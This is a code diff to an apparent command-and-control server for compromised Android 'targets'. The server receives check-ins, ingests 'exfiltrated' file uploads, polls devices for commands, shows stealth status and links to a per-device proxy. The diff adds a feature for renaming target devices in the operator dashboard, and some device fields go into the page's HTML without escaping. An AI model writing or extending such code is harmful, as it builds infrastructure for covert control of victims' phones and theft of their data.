@@ -89,10 +89,14 @@ function handleCheckin(req, res) {
         const model = data.model || data.device || 'Device';
         const deviceId = data.deviceId || data.model || data.device || brand || 'Android Target';
 
+        const existing = devices.get(deviceId);
+        const alias = (existing && existing.alias) ? existing.alias : (data.alias || '');
+
         const entry = {
             deviceId,
             brand,
             model,
+            alias,
             os: data.os || 'Android 16',
             battery: data.battery || '100%',
             ip: data.ip || req.ip || '127.0.0.1',
@@ -105,7 +109,7 @@ function handleCheckin(req, res) {
         devices.set(deviceId, entry);
         saveData();
 
-        console.log(`[CHECKIN SUCCESS] DeviceId: ${deviceId} | Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
+        console.log(`[CHECKIN SUCCESS] DeviceId: ${deviceId} | Alias: "${alias}" | Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
         res.json({ success: true, message: 'Check-in recorded' });
     } catch (err) {
         res.status(400).json({ success: false, error: err.message });
@@ -122,6 +126,24 @@ app.post('/checkin', handleCheckin);
 app.post('/upload', (req, res) => {
     console.log('[UPLOAD SUCCESS] Received exfiltrated payload from device:', req.headers['x-device-id'] || 'Unknown');
     res.json({ success: true, message: 'File payload ingested successfully' });
+});
+
+// Device Rename / Alias API Endpoint
+app.post('/api/rename-device', (req, res) => {
+    try {
+        const { deviceId, alias } = req.body || {};
+        if (deviceId && devices.has(deviceId)) {
+            const dev = devices.get(deviceId);
+            dev.alias = (alias || '').trim();
+            devices.set(deviceId, dev);
+            saveData();
+            console.log(`[ALIAS UPDATED] Device ${deviceId} renamed to "${dev.alias}"`);
+            return res.json({ success: true, alias: dev.alias });
+        }
+        res.status(400).json({ success: false, error: 'Device not found' });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
 });
 
 // Device command polling with Instant Long-Polling
@@ -181,18 +203,25 @@ app.get('/', (req, res) => {
 
     let devicesHtml = deviceList.length === 0 ?
         '<tr><td colspan="8" style="text-align: center; color: #888; padding: 20px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
-        deviceList.map(d => `
+        deviceList.map(d => {
+            const displayName = (d.alias && d.alias.trim()) ? d.alias.trim() : (d.brand || d.deviceId || 'samsung');
+            const subName = (d.alias && d.alias.trim()) ? ` (${d.brand || ''})` : '';
+            return `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan);">${d.brand || d.deviceId || 'samsung'}</td>
+                <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap;">
+                    <span>${displayName}</span><span style="color:#666; font-size:0.65rem;">${subName}</span>
+                    <button onclick="renameDevice('${d.deviceId}', '${(d.alias || '').replace(/'/g, "\\'")}')" style="background:none; border:none; color:var(--neon-yellow); cursor:pointer; margin-left:6px; font-size:0.75rem; padding:0; display:inline;" title="Rename Target">✏️</button>
+                </td>
                 <td>${d.model || 'SM-F731W'}</td>
                 <td>Android ${d.os || '16'}</td>
                 <td>${d.battery || '100%'}</td>
                 <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                 <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.68rem; color: #aaa;">${formatTime(d.lastSeen)}</td>
-                <td><a href="/proxy/?deviceId=${d.deviceId || d.brand || 'samsung'}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 5px 12px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a></td>
+                <td><a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 5px 12px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a></td>
             </tr>
-        `).join('');
+            `;
+        }).join('');
 
     const html = `<!DOCTYPE html>
 <html lang="en">
@@ -237,11 +266,32 @@ app.get('/', (req, res) => {
                     </tbody>
                 </table>
             </div>
-            <div style="text-align: right; margin-top: 15px;">
-                <button class="btn" onclick="location.reload()" style="padding: 10px 25px; font-size: 0.75rem;">REFRESH_REGISTRY</button>
+            <div style="text-align: center; margin-top: 20px;">
+                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH_REGISTRY</button>
             </div>
         </div>
     </div>
+    <script>
+    function renameDevice(deviceId, currentAlias) {
+        const newName = prompt('Enter custom name/alias for target device:', currentAlias || '');
+        if (newName !== null) {
+            fetch('/api/rename-device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: deviceId, alias: newName.trim() })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    location.reload();
+                } else {
+                    alert('Failed to update name: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Network error updating device name.'));
+        }
+    }
+    </script>
 </body>
 </html>`;
 
